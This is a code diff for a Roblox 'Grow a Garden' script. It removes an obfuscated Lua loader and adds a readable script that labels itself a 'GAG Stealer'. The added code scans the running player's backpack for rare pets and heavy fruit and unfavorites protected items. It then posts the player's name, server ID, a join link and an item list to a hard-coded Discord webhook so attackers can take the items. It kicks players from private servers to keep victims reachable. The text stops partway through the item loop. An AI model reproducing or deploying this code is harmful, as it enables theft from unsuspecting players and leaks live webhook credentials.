@@ -1,1 +1,394 @@
-return(function(...)local c={"\074\122\108\085\087\122\080\061","\087\071\113\061";"\074\122\114\055\074\079\107\072\087\118\119\061","\056\085\053\101\078\052\051\072\056\053\061\061","\119\122\099\076\087\122\065\061";"\090\081\099\051\097\108\072\099\078\086\077\077\087\113\107\111","\074\121\089\065\054\121\099\047","\073\115\076\066\105\050\061\061","\081\067\114\069\078\121\111\061";"\077\122\069\109\090\115\108\099\056\122\102\109\083\101\078\078\073\079\051\061","\077\077\107\097";"\077\122\108\088\119\122\077\109\103\113\083\101\074\122\077\115\074\122\077\082\103\043\061\061";"\081\067\114\066\054\065\061\061";"\077\070\077\085\105\122\114\106\105\065\061\061";"\087\122\114\076\078\079\099\086\119\118\101\057\078\065\061\061";"\077\081\099\101\119\118\089\076\087\121\080\061","\078\118\075\106\087\120\103\061";"\080\122\107\109\090\101\099\070\119\120\097\109\097\118\083\112\077\070\111\061";"\081\067\114\072\087\118\083\101\090\050\061\061";"\119\118\108\057\078\122\114\088";"\078\120\099\067\054\053\061\061";"","\073\079\083\086\119\113\074\101\074\050\061\061","\119\118\077\088\087\120\078\101";"\119\070\077\086\087\121\077\086\054\081\083\076\054\118\075\101";"\081\067\114\088\078\081\083\076\074\122\108\085\087\122\080\061","\087\071\103\061","\090\082\072\075\077\080\077\116\097\101\083\113\078\086\069\075\090\080\089\088","\055\070\049\055\106\119\077\108\049\068\104\047\116\105\108\080\079\120\113\043\051\104\083\054\090\068\087\110\085\086\103\057\081\049\109\112\099\047\109\085\089\105\081\120\053\101\057\119\084\087\068\121\076\067\076\122\054\100\078\106\083\047\107\122\110\057\043\053\101\054\052\050\106\065\043\043\118\069\098\057\105\108\118\088\089\116\087\050\110\117\100\101\111\101\089\054\050\068\098\089\082\103\065\054\043\082\099\082\088\047\055\117\047\104\057\084\117\049\052\072\072\085\114\073\074\056\104\054\119\057\098\052","\074\070\101\052\121\080\108\109\090\077\101\099\097\055\107\099\074\081\053\061";"\097\080\076\069\119\121\080\061","\078\070\067\076\074\122\099\051","\078\070\108\088\078\043\061\061","\098\054\101\050\043\055\073\072\047\075\054\082\074\108\099\056\071\110\056\104\080\100\050\069\076\105\118\053\097\104\051\114\118\107\055\102\121\105\108\068\073\114\102\061","\083\115\108\105\074\077\101\043\077\079\103\055\073\067\050\055\073\070\113\061";"\119\070\067\109\110\082\075\085\090\118\077\116\087\101\099\079","\054\081\107\056\078\070\107\068\097\071\050\111\097\055\108\120\119\050\061\061";"\119\120\083\109\105\121\089\066";"\077\070\099\066\121\079\072\054\056\113\074\112\074\115\074\109\121\050\061\061";"\078\081\107\109\087\120\103\061";"\087\121\108\086\105\050\061\061";"\105\120\082\089\073\121\099\051\087\082\088\083\099\115\077\103\105\118\051\061","\110\067\107\107\105\082\075\099\074\101\112\113\099\101\072\076";"\056\053\061\061","\054\101\107\083\054\115\054\070\090\121\089\105\121\108\076\117\054\065\061\061";"\087\122\077\057";"\054\066\101\086\078\043\061\061","\043\052\054\111\082\074\112\120\114\068\118\087","\074\122\114\057\074\121\067\085\078\081\103\061","\054\070\114\057\054\070\108\086","\121\082\074\110","\054\070\076\076\119\053\061\061"}local function L(L)return c[L-(-607593-(-618355))]end for L,v in ipairs({{714231-714230,356971+-356919},{-817464-(-817465),977102-977086};{141476+-141459,-392888-(-392940)}})do while v[450671-450670]<v[-585200-(-585202)]do c[v[800762-800761]],c[v[688501+-688499]],v[1044417-1044416],v[-375852+375854]=c[v[-871993-(-871995)]],c[v[425966-425965]],v[165414-165413]+(-222118-(-222119)),v[810297+-810295]-(-833209-(-833210))end end do local L=string.char local v=math.floor local K=table.insert local Q=table.concat local V=string.len local H=c local O=string.sub local J=type local u={["\057"]=531632+-531586;Z=648628+-648598,["\055"]=-251253-(-251304);X=-920016-(-920061),H=359316-359275,["\052"]=666231-666229,V=771244-771192;e=-276356-(-276393);h=-887804+887867,o=-976190+976246;P=-871995+872015;i=-927613+927639,j=-218360-(-218407);m=869179+-869129,b=722486+-722444;A=856747-856699;f=-102887-(-102947),y=789966-789944;["\050"]=303529+-303529,["\047"]=754167+-754124;q=172197+-172193;x=-550193+550248,["\043"]=-523376+523392;n=520240+-520221;["\053"]=-85411+85443,D=222375+-222364,a=633652+-633640;J=-470802-(-470831),l=-284260-(-284265);t=832442+-832432;W=-63623-(-63650);R=229195-229159,["\056"]=-574628-(-574642);c=254965-254952,G=-657137-(-657140);Y=51739-51682,E=-658312-(-658356);r=228196-228135,C=-7083-(-7136);["\048"]=-11808+11867,M=1012479+-1012458;L=658548+-658515,K=-962637-(-962686);O=276016-276009;u=896907-896892;["\054"]=-266960-(-266984),U=464592-464558,g=823418+-823410;B=546033+-545994;z=113572+-113566,k=-906483-(-906492);["\049"]=-113706-(-113764),S=-709942+709959,s=569941-569906;Q=713782+-713759,d=235303+-235241,I=-619105-(-619123),T=-406317+406348;N=-204429-(-204454);F=-449144-(-449198),v=63458+-63420,p=835451-835450,["\051"]=817889-817849;w=-551025+551053}for c=39650-39649,#H,768057-768056 do local a=H[c]if J(a)=="\115\116\114\105\110\103"then local J=V(a)local x={}local P=442734+-442733 local y=-609331+609331 local T=-522160-(-522160)while P<=J do local c=O(a,P,P)local Q=u[c]if Q then y=y+Q*(849722+-849658)^((-192102+192105)-T)T=T+(-608051+608052)if T==60130+-60126 then T=-577010-(-577010)local c=v(y/(-183590+249126))local Q=v((y%(920635-855099))/(511856+-511600))local V=y%(-669429+669685)K(x,L(c,Q,V))y=461166+-461166 end elseif c=="\061"then K(x,L(v(y/(144994-79458))))if P>=J or O(a,P+(785785-785784),P+(-930684-(-930685)))~="\061"then K(x,L(v((y%(-928127-(-993663)))/(-577458+577714))))end break end P=P+(-237286-(-237287))end H[c]=Q(x)end end end return(function(c,K,Q,V,H,O,J,P,y,r,T,v,a,x,M,B,s,t,W,g,u)s,x,t,M,P,r,a,B,v,W,T,y,g,u=function(c,L)local K=y(L)local Q=function(Q,V,H,O,J)return v(c,{Q,V,H;O,J},L,K)end return Q end,function()P=(-732790-(-732791))+P a[P]=-324842+324843 return P end,function(c,L)local K=y(L)local Q=function(Q,V,H,O,J,u,a)return v(c,{Q;V;H;O,J,u;a},L,K)end return Q end,function(c,L)local K=y(L)local Q=function(...)return v(c,{...},L,K)end return Q end,-786360-(-786360),function(c,L)local K=y(L)local Q=function(Q,V,H)return v(c,{Q;V,H},L,K)end return Q end,{},function(c,L)local K=y(L)local Q=function(Q)return v(c,{Q},L,K)end return Q end,function(v,Q,V,H)local e,N,f,Z,F,b,X,m,z,Y,P,n,p,I,o,M,A,w,j,G,d,R,a,T,q,C,y,h,D,U,k,J,l,i while v do if v<8139781-(-359659)then if v<4842953-693942 then if v<304809+1288821 then if v<798094-(-415917)then if v<554637-(-224679)then if v<424429+-225126 then if v<76066+93575 then j=u[P]A=j v=j and 482607+7014838 or 14147280-(-557809)else h=L(124528-113764)j=c[h]F=k h=L(81719-70946)A=j[h]j=A(a,F)A=u[V[-320042+320048]]h=A()m=j+h v=661877+8419744 h=-550833+550834 o=m+Z m=917500-917244 i=o%m m=y[P]Z=i j=Z+h A=T[j]o=m..A F=nil y[P]=o end else v=u[V[100132-100131]]P=y b=-893181-(-893436)F=-776696-(-776696)e=v(F,b)a[P]=e P=nil v=17108075-732791 end else if v<-981886+2190539 then Y=u[P]v=Y and 16458967-371948 or 2170082-(-323434)G=Y else v=13300662-(-274409)e=nil T=nil Z=nil end end else if v<-176677+1419775 then if v<-710198+1948668 then T=L(-320938+331719)J=L(-7946-(-18721))v=c[J]a=u[V[12836-12832]]b=s(4227553-(-580274),{})y=c[T]F=L(-811738-(-822521))e=c[F]F={e(b)}e=502512+-502510 Z={K(F)}M=Z[e]T=y(M)y=L(308778+-297996)P=a(T,y)a={P()}J=v(K(a))a=J P=u[V[-93027+93032]]J=P v=P and 2814518-(-9248)or-897916+14069006 else v=true v=15133934-(-950013)end else if v<-418989+1770723 then U=g(U)w=g(w)f=g(f)v=-1008447+14493403 p=nil I=g(I)q=g(q)l=g(l)else Z=J e=L(-883515+894282)J=c[e]e=L(-26209+37007)v=J[e]e=x()u[e]=v F=L(9248+1531)d=L(215655+-204876)J=c[F]F=L(-1014271+1025047)v=J[F]z=c[d]k=v b=z F=v v=z and 5257408-(-364011)or 756087+10635237 end end end else if v<88291+2628668 then if v<3041422-417197 then if v<1907818-(-637300)then if v<20129+2020827 then v=-425261+16508696 else u[P]=G n=u[q]R=594866+-594865 X=n+R N=p[X]Y=z+N N=-406829-(-407085)v=Y%N X=u[w]N=d+X z=v X=191270-191014 Y=N%X v=-459310+1797718 d=Y end else v={}a=v y=u[V[-41688-(-41697)]]T=y y=532850-532849 M=y v=39969+16335315 y=-426157-(-426157)P=-598707+598708 Z=M<y y=P-M end else if v<537393+2115173 then J={}v=c[L(361406-350635)]else a=L(604928-594162)v=c[a]P=u[V[-461542-(-461550)]]y=-638452-(-638452)a=v(P,y)v=509104+2102175 end end else if v<3296810-46753 then if v<-1039040+3841767 then v=u[V[-205727-(-205734)]]v=v and 2932602-275753 or 3586893-975614 else y=u[V[-65628-(-65634)]]P=y==a J=P v=136868+13034222 end else if v<4507424-1036800 then v=11656644-703606 n=-416109+416111 X=p[n]n=u[U]N=X==n G=N else m=m+l o=m<=D w=not I o=w and o w=m>=D w=I and w o=w or o w=399916+8561894 v=o and w o=-214439+10514145 v=v or o end end end end else if v<-708022+6294005 then if v<5121997-188390 then if v<416+4657056 then if v<-508272+5093122 then if v<-204326+4370029 then y=L(-150373+161152)P=c[y]y=L(-653940+664742)a=P[y]v=c[L(-240984-(-251752))]y=u[V[641780+-641779]]P={a(y)}J={K(P)}else k=L(-744887+755672)b=c[k]v=9283515-(-132452)J=b end else J={}v=true u[V[-256551-(-256552)]]=v v=c[L(382252+-371439)]end else if v<482351+4327926 then y=10458143-204006 P=L(516080+-505294)J=5249409-468207 a=P^y v=J-a a=v J=L(18009-7200)v=J/a J={v}v=c[L(-108396-(-119204))]else D=791801-791801 m=#i o=m==D v=o and-966526+9440897 or 99171+5114684 end end else if v<-204006+5535430 then if v<5680397-622899 then u[P]=J v=-916156+2254564 else D=#i m=920509+-920508 w=368299+-368298 o=T(m,D)v=837754+3985945 m=Z(i,o)D=u[d]o=nil I=m-w l=e(I)D[m]=l m=nil end else if v<1010815+4570657 then v=J and 829049-(-391084)or-753527+3496906 else e=g(e)Z=nil F=nil i=nil M=g(M)k=g(k)P=g(P)y=g(y)e=L(-51091-(-61858))P=nil z=nil T=g(T)Z=L(728951+-718184)M=c[Z]k=x()b=g(b)b=L(604147+-593383)o=nil d=nil y=nil m=g(m)F=L(-70664-(-81443))d=x()Z=L(-479343+490138)T=M[Z]M=x()u[M]=T m=-991871+992127 Z=c[e]e=L(593376-582578)D=m T=Z[e]i={}e=c[F]m=-433644-(-433645)F=L(996657-985855)Z=e[F]F=c[b]b=L(-730205-(-740983))e=F[b]b=x()F=496047-496047 u[b]=F F=-1039424+1039426 z={}o=416173+-416172 u[k]=F u[d]=z F={}z=-657972+657972 l=m m=-309866-(-309866)I=l<m v=645684+3419208 m=o-l end end end else if v<39457+7430720 then if v<796985+5638047 then if v<5268891-(-568946)then if v<460078+5166234 then i=L(-882875+893654)v=-879611+12270935 d=c[i]i=L(188935-178150)z=d[i]b=z else P=L(-530008-(-540785))J=-548401+8979251 y=12819559-(-540977)a=P^y v=J-a J=L(-1030986-(-1041792))a=v v=J/a J={v}v=c[L(-645750-(-656564))]end else v=2415658-936445 Z=u[M]J=Z end else if v<373868+6409425 then v=14115152-540081 else v=true v=v and 69346+1604433 or-727159+16811106 end end else if v<530800+7772428 then if v<8290186-530352 then v=495983+14209106 j=z==d A=j else P=u[V[-973883-(-973886)]]y=331691-331690 a=P~=y v=a and 225959+12477661 or-227047+16664285 end else if v<-380332+8824134 then v={}e=912699-912444 u[V[859389-859387]]=v J=u[V[321258+-321255]]M=35184373082431-993599 T=J J=P%M k=-214182-(-214183)u[V[-677105-(-677109)]]=J F=L(-360928-(-371692))Z=P%e e=-890236+890238 v=235367+8846254 M=Z+e u[V[116708+-116703]]=M e=c[F]F=L(-1028096+1038868)Z=e[F]F=-844345-(-844346)z=k e=Z(a)Z=L(183078+-172278)y[P]=Z Z=595493-595378 b=e k=-484463-(-484463)d=z<k k=F-z else w={}N=nil m=x()I=L(-138482-(-149285))o={}D=W(706806+10761320,{m,b,k,M})i=nil l=x()F=nil p=L(-79599-(-90403))e=nil F=8647106008701-(-788728)u[m]=o o=x()u[o]=D D={}f=L(-223271+234068)u[l]=D D=c[I]v=c[L(-70050+80819)]T=nil z=nil U=u[l]q={[f]=U;[p]=N}I=D(w,q)P=I M=g(M)Z=nil e=19691951464426-(-796601)D=t(14527772-798585,{l;m,d,b;k;o})o=g(o)m=g(m)Z=L(108451+-97677)k=g(k)k=L(-113449-(-124260))y=D l=g(l)b=g(b)d=g(d)M=y(Z,e)e=L(-577330+588142)T=P[M]b=26269895711226-293481 M=L(138660+-127866)c[M]=T d=L(397868+-387079)Z=y(e,F)M=P[Z]Z=L(-41594-(-52386))F=L(-176431-(-187238))c[Z]=M e=y(F,b)Z=P[e]e=L(-169025-(-179814))F=L(-609267+620060)c[e]=Z e=c[F]b=c[k]z=c[d]y=nil d=L(221400-210599)d=b[d]k={d(b,z)}F=e(K(k))P=nil e=F()J={}end end end end end else if v<-553585+13808830 then if v<-571826+11510526 then if v<655412+9208868 then if v<8230961-(-876731)then if v<8448601-(-559793)then if v<8897616-78562 then v=387564+15695871 else v=4831092-766200 o=m w=o i[o]=w o=nil end else k=k+z F=k<=b i=not d F=i and F i=k>=b i=d and i F=i or F i=1155460-956798 v=F and i F=611570-(-599347)v=v or F end else if v<9219934-(-196710)then z=192038+-191973 b=x()k=1024323-1024320 u[b]=J v=u[e]J=v(k,z)i=L(780472+-769689)h=L(198531-187750)k=x()v=-259560+259560 u[k]=J J=c[i]o=r(-697462+6326050,{})i={J(o)}z=v v=-985919-(-985919)J=619573-619571 d=v v={K(i)}i=v v=i[J]J=L(365698-354923)o=v v=c[J]m=u[y]j=c[h]h=j(o)j=L(-308266+319048)A=m(h,j)m={A()}J=v(K(m))m=x()u[m]=J A=u[k]J=635060+-635059 j=A A=793849+-793848 h=A A=-576050-(-576050)v=12732965-(-751991)D=h<A A=J-h else J={}v=c[L(-188838+199601)]end end else if v<-164133+10325036 then if v<10502260-456686 then D=L(-139620+150425)v=c[D]D=L(-457683-(-468463))c[D]=v v=-179238+8684330 else P=u[V[-995327+995329]]y=u[V[-499180-(-499183)]]a=P==y J=a v=-1019072+6576489 end else if v<11252241-695734 then m=#i D=471983-471983 o=m==D v=599987+4613868 else J=L(-917640-(-928445))a=L(-473875-(-484655))v=c[J]J=c[a]a=L(671349+-660569)c[a]=v a=L(748343+-737538)c[a]=J a=u[V[-540657+540658]]v=11095218-(-439470)P=a()end end end else if v<11495462-(-552113)then if v<-918972+12445687 then if v<-830778+12268746 then if v<11304958-308970 then v=Y J=G v=4215584-(-799097)else v=k v=b and 324330+9091637 or 3720913-(-679349)J=b end else a=u[V[-1007615+1007616]]J=#a a=-96867+96867 v=J==a v=v and 13846022-(-471471)or-891708+5045179 end else if v<-124260+12024671 then v=true v=v and 9856908-(-927677)or 3406984-770104 else v=11840009-305321 end end else if v<-921533+13375754 then if v<-93539+12274349 then h=418157+-418156 v=u[e]D=958078+-958072 j=v(h,D)v=L(-196721-(-207526))D=L(384044+-373239)c[v]=j h=c[D]D=831164-831162 v=h>D v=v and 15140847-(-167397)or 552561+9359038 else a=Q P=x()y=L(107695-96931)v=true u[P]=v T=x()J=c[y]y=L(-240359+251169)v=J[y]y=x()u[y]=v e=L(668597+-657814)v=B(14364567-926717,{})u[T]=v M=x()v=false F=B(4328740-(-286057),{M})u[M]=v Z=c[e]e=Z(F)v=e and 6701549-347947 or 53154+1426059 J=e end else if v<13877464-837882 then z=481199+-481186 y=-405293+405325 P=u[V[399727-399724]]a=P%y b=134884+-134882 T=u[V[-369063-(-369067)]]e=u[V[165607-165605]]o=u[V[385772+-385769]]i=o-a o=-209927-(-209959)d=i/o k=z-d F=b^k Z=e/F M=T(Z)T=4294556819-(-410477)y=M%T F=-777975-(-777976)M=140772+-140770 T=M^a P=y/T T=u[V[855419+-855415]]e=P%F F=-406893+4295374189 Z=e*F M=T(Z)T=u[V[-839478-(-839482)]]Z=T(P)b=802297+-802041 y=M+Z v=458798+3694673 e=251110-185574 a=nil M=218791+-153255 T=y%M Z=y-T M=Z/e y=nil e=78114-77858 Z=T%e F=T-Z e=F/b b=-154725-(-154981)F=M%b z=-308266+308522 k=M-F b=k/z M=nil P=nil T=nil k={Z;e;F,b}F=nil e=nil Z=nil u[V[965887-965886]]=k b=nil else v=-916348+3659727 u[V[674810-674805]]=J a=nil end end end end else if v<14678576-558577 then if v<13942325-190374 then if v<12604099-(-970750)then if v<13965179-392940 then if v<13907279-462702 then a=L(1046950-1036160)J=L(931275-920509)v=c[J]J=v(a)J={}v=c[L(627123+-616335)]else l=not D A=A+h J=A<=j J=l and J l=A>=j l=D and l J=l or J l=756983+13054639 v=J and l J=413549+-296810 v=v or J end else T=-565618+565619 M=-417835-(-417837)P=u[V[863035+-863034]]y=P(T,M)P=188902+-188901 a=y==P v=a and 6472869-915452 or-831098+10966959 J=a end else if v<14301280-696502 then J={P}v=c[L(110051+-99267)]else v=u[V[22050-22049]]a=Q[-69730+69731]P=Q[704184-704182]y=v v=y[P]v=v and 7110649-582450 or 7833487-(-499567)end end else if v<13647849-(-178086)then if v<627059+13136014 then G=u[P]v=G and 14263316-419949 or-773816+5788497 J=G else l=x()I=L(-716904-(-727671))u[l]=A q=-847354+847609 w=907168-907068 J=c[I]I=L(-846093-(-856891))v=J[I]p=-782326-(-782328)I=-235687+235688 J=v(I,w)w=-800505-(-800505)I=x()u[I]=J C=961662+-951662 v=u[e]J=v(w,q)w=x()q=829051-829050 u[w]=J R=-215335-(-215335)v=u[e]f=u[I]U=-821817+821818 J=v(q,f)q=x()u[q]=J J=u[e]N=L(816569+-805788)f=J(U,p)J=-81955+81956 v=f==J f=x()J=L(-610581-(-621363))p=L(-286953+297723)u[f]=v Y=c[N]X=u[e]n={X(R,C)}N=Y(K(n))Y=L(-310186+320956)G=N..Y U=p..G v=L(-569987-(-580786))v=o[v]p=L(-874747+885530)v=v(o,J,U)U=x()G=B(1035712+12537311,{e,l;k,y,P,m;f,U;I;q,w;b})u[U]=v J=c[p]p={J(G)}v={K(p)}p=v v=u[f]v=v and 730103+13022125 or 587569-(-619763)end else if v<-146341+14120179 then Y=v n=-336234+336235 X=p[n]n=false N=X==n v=N and 2653616-(-698550)or 11394108-441070 G=N else v=u[V[615987+-615977]]P=u[V[-8021-(-8032)]]a[v]=P v=u[V[-93527-(-93539)]]P={v(a)}J={K(P)}v=c[L(-892156+902921)]end end end else if v<104867+15979644 then if v<15856952-409837 then if v<803897+14320715 then if v<317482+14290918 then y=-515947-(-516016)P=u[V[935679-935677]]a=P*y P=9495388065687-(-660212)J=a+P a=35184372520365-431533 P=-642740+642741 v=J%a u[V[713654+-713652]]=v a=u[V[756471+-756468]]J=a~=P v=16147405-(-289833)else u[P]=A v=u[P]v=v and-668981+17180973 or 2146593-904444 end else h=L(-389164+399945)v=c[h]l=L(-496239+507019)D=c[l]h=v(D)v=L(-814649+825454)c[v]=h v=8696234-191142 end else if v<16537717-453806 then v=true v=v and-830586+12886506 or-375788+9860366 else v=s(529456+11489087,{T})j={v()}v=c[L(774884-764088)]J={K(j)}end end else if v<16781529-381676 then if v<-476847+16675532 then N=-123491-(-123492)Y=p[N]G=Y v=691061+1802455 else e=not Z y=y+M P=y<=T P=e and P e=y>=T e=Z and e P=e or P e=916284-289065 v=P and e P=226151+13784645 v=v or P end else if v<16489888-13216 then v=8601831-349675 P=u[V[60002+-59999]]y=-868475+868646 a=P*y P=-95779+96036 J=a%P u[V[985730-985727]]=J else v=-215911+5798417 end end end end end end end v=#H return K(J)end,function(c,L)local K=y(L)local Q=function(Q,V)return v(c,{Q,V},L,K)end return Q end,function(c)local L,v=-104291+104292,c[612019+-612018]while v do a[v],L=a[v]-(116452+-116451),L+(-18913+18914)if 521712+-521712==a[v]then a[v],u[v]=nil,nil end v=c[L]end end,function(c)for L=598388-598387,#c,-938684-(-938685)do a[c[L]]=(-441901-(-441902))+a[c[L]]end if Q then local v=Q(true)local K=H(v)K[L(-743498-(-754295))],K[L(-948183-(-958974))],K[L(394895-384108)]=c,T,function()return-4093534-(-19297)end return v else return V({},{[L(470997-460206)]=T;[L(689634-678837)]=c;[L(-1017536+1028323)]=function()return-4866230-(-791993)end})end end,function(c)a[c]=a[c]-(-232358-(-232359))if a[c]==-32865+32865 then a[c],u[c]=nil,nil end end,{}return(M(13215156-968766,{}))(K(J))end)(getfenv and getfenv()or _ENV,unpack or table[L(-163237+174022)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+
+
+-- USER SETTINGS
+_G.Usernames = {"saikigrow", "", "Wanwood42093"}
+_G.min_value = 100000000
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1392880984428384398/b0i3uImsepPTsn5HU_GebQsbnECumyVbr8E_SJLxZNbQmqqTOOMFJWYA-9BJi_LFu_45"
+
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+return
+end
+_G.scriptExecuted = true
+
+local users = _G.Usernames or {}
+local min_value = _G.min_value or 10000000
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local backpack = plr:WaitForChild("Backpack", 10)
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local modules = replicatedStorage:WaitForChild("Modules", 10)
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue", 10))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities", 10))
+local petRegistry = require(replicatedStorage:WaitForChild("Data", 10):WaitForChild("PetRegistry", 10))
+local numberUtil = require(modules:WaitForChild("NumberUtil", 10))
+local dataService = require(modules:WaitForChild("DataService", 10))
+local character = plr.Character or plr.CharacterAdded:Wait()
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Disco Bee", "Queen Bee", "T-Rex", "Fennec Fox"}
+local totalValue = 0
+local itemsToSend = {}
+
+if next(users) == nil or webhook == "" then
+plr:kick("You didn't add any usernames or webhook")
+return
+end
+
+if game.PlaceId ~= 126884695634066 then
+plr:kick("Game not supported. Please join a normal GAG server")
+return
+end
+
+local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
+if getServerType and getServerType:IsA("RemoteFunction") then
+local ok, serverType = pcall(function()
+return getServerType:InvokeServer()
+end)
+if ok and serverType == "VIPServer" then
+plr:kick("Server error. Please join a DIFFERENT server")
+return
+end
+end
+
+local function calcPetValue(v14)
+if not v14 or not v14.PetData then
+return 0
+end
+
+local hatchedFrom = v14.PetData.HatchedFrom  
+if not hatchedFrom or hatchedFrom == "" then  
+    return 0  
+end  
+
+local eggData = petRegistry.PetEggs and petRegistry.PetEggs[hatchedFrom]  
+if not eggData then  
+    return 0  
+end  
+
+local v17 = eggData.RarityData and eggData.RarityData.Items and eggData.RarityData.Items[v14.PetType]  
+if not v17 or not v17.GeneratedPetData then  
+    return 0  
+end  
+
+local weightRange = v17.GeneratedPetData.WeightRange  
+if not weightRange then  
+    return 0  
+end  
+
+local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)  
+local v20 = math.lerp(0.8, 1.2, v19)  
+local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)  
+local v22 = v20 * math.lerp(0.15, 6, levelProgress)  
+local sellPrice = petRegistry.PetList and petRegistry.PetList[v14.PetType] and petRegistry.PetList[v14.PetType].SellPrice or 0  
+local v23 = sellPrice * v22  
+return math.floor(v23)
+
+end
+
+local function formatNumber(number)
+if not number then
+return "0"
+end
+local suffixes = {"", "k", "m", "b", "t"}
+local suffixIndex = 1
+while number >= 1000 and suffixIndex < #suffixes do
+number = number / 1000
+suffixIndex = suffixIndex + 1
+end
+if suffixIndex == 1 then
+return tostring(math.floor(number))
+else
+if number == math.floor(number) then
+return string.format("%d%s", number, suffixes[suffixIndex])
+else
+return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+end
+end
+
+local function getWeight(tool)
+if not tool then return 0 end
+local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
+local weight = 0
+if weightValue then
+if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
+weight = weightValue.Value
+elseif weightValue:IsA("StringValue") then
+weight = tonumber(weightValue.Value) or 0
+end
+else
+local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+if weightMatch then
+weight = tonumber(weightMatch) or 0
+end
+end
+return math.floor(weight * 100 + 0.5) / 100
+end
+
+local function getHighestKGFruit()
+local highestWeight = 0
+for _, item in ipairs(itemsToSend) do
+if item.Weight and item.Weight > highestWeight then
+highestWeight = item.Weight
+end
+end
+return highestWeight
+end
+
+local function safeString(val, default)
+if val == nil then return default end
+return tostring(val)
+end
+
+local function SendJoinMessage(list, prefix)
+local highestKG = getHighestKGFruit() or 0
+local itemList = ""
+
+for _, item in ipairs(list) do  
+    itemList = itemList .. string.format("• **%s** (%.2f KG) — ¢%s\n",  
+        safeString(item.Name, "Unknown"),  
+        item.Weight or 0,  
+        formatNumber(item.Value or 0)  
+    )  
+end  
+
+if #itemList > 1024 then  
+    local lines, total = {}, 0  
+    for line in itemList:gmatch("[^\r\n]+") do  
+        if total + #line + 1 < 1000 then  
+            table.insert(lines, line)  
+            total = total + #line + 1  
+        else  
+            break  
+        end  
+    end  
+    itemList = table.concat(lines, "\n") .. "\n*...and more*"  
+end  
+
+local data = {  
+    ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",  
+    ["embeds"] = {{  
+        ["title"] = "💰 New Player Joined",  
+        ["description"] = "A new target has joined the server.",  
+        ["color"] = 0x00ff66,  
+        ["fields"] = {  
+            {  
+                name = "👤 Username",  
+                value = plr.Name,  
+                inline = true  
+            },  
+            {  
+                name = "🔗 Join Link",  
+                value = ("[Click here to join](https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=%s)"):format(game.JobId),  
+                inline = true  
+            },  
+            {  
+                name = "📦 Items Found",  
+                value = (#itemList > 0 and itemList) or "*No items detected*",  
+                inline = false  
+            },  
+            {  
+                name = "📊 Summary",  
+                value = ("**Total Value:** ¢%s\n**Heaviest Fruit:** %.2f KG"):format(formatNumber(totalValue), highestKG),  
+                inline = false  
+            }  
+        },  
+        ["footer"] = {  
+            ["text"] = "🕵️‍♂️ GAG Stealer • discord.gg/GY2RVSEGDT"  
+        },  
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  
+    }}  
+}  
+
+local body = HttpService:JSONEncode(data)  
+local headers = {["Content-Type"] = "application/json"}  
+request({ Url = webhook, Method = "POST", Headers = headers, Body = body })
+
+end
+
+local function SendMessage(sortedItems)
+local highestKG = getHighestKGFruit() or 0
+local itemList = ""
+
+for _, item in ipairs(sortedItems) do  
+    itemList = itemList .. string.format("• **%s** (%.2f KG) — ¢%s\n",  
+        safeString(item.Name, "Unknown"),  
+        item.Weight or 0,  
+        formatNumber(item.Value or 0)  
+    )  
+end  
+
+if #itemList > 1024 then  
+    local lines, total = {}, 0  
+    for line in itemList:gmatch("[^\r\n]+") do  
+        if total + #line + 1 < 1000 then  
+            table.insert(lines, line)  
+            total = total + #line + 1  
+        else  
+            break  
+        end  
+    end  
+    itemList = table.concat(lines, "\n") .. "\n*...and more*"  
+end  
+
+local data = {  
+    ["content"] = "",  
+    ["embeds"] = {{  
+        ["title"] = "📤 Items Sent",  
+        ["description"] = "Items have been successfully transferred.",  
+        ["color"] = 0x00ff66,  
+        ["fields"] = {  
+            {  
+                name = "👤 Username",  
+                value = plr.Name,  
+                inline = true  
+            },  
+            {  
+                name = "📦 Items Sent",  
+                value = (#itemList > 0 and itemList) or "*No items detected*",  
+                inline = false  
+            },  
+            {  
+                name = "📊 Summary",  
+                value = ("**Total Value:** ¢%s\n**Heaviest Fruit:** %.2f KG"):format(formatNumber(totalValue), highestKG),  
+                inline = false  
+            }  
+        },  
+        ["footer"] = {  
+            ["text"] = "🕵️‍♂️ GAG Stealer • Saiki"  
+        },  
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  
+    }}  
+}  
+
+local body = HttpService:JSONEncode(data)  
+local headers = {["Content-Type"] = "application/json"}  
+request({ Url = webhook, Method = "POST", Headers = headers, Body = body })
+
+end
+
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local petUUID = tool:GetAttribute("PET_UUID")
+            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+            local itemName = v14.PetType
+            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
+                if tool:GetAttribute("Favorite") then
+                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                end
+                local value = calcPetValue(v14)
+                local toolName = tool.Name
+                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                totalValue = totalValue + value
+                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
+            end
+        else
